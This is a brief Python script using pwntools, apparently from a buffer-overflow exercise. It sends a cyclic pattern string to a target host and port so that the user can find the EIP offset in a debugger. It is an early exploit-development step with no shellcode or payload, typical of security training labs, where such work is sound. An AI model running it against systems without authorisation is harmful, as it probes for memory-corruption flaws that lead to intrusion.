#!/usr/bin/python3

# Author: AnubiSec - Dylan M

import socket
import sys
import time
from pwn import * #pwntools




if len(sys.argv) < 4:
	print("\nUsage: " + sys.argv[0] + " <HOST> <PORT> $(pattern_offset -l <LENGTH NEEDED>) \n")
	sys.exit()

host = sys.argv[1]
port = sys.argv[2]
data = sys.argv[3]

p = remote(host, port) # connect to host
p.sendline(data) #send payload (here being the unique string generated from pattern_offset.rb)
print("Sent evil buffer >:) Check your debugger for the EIP")
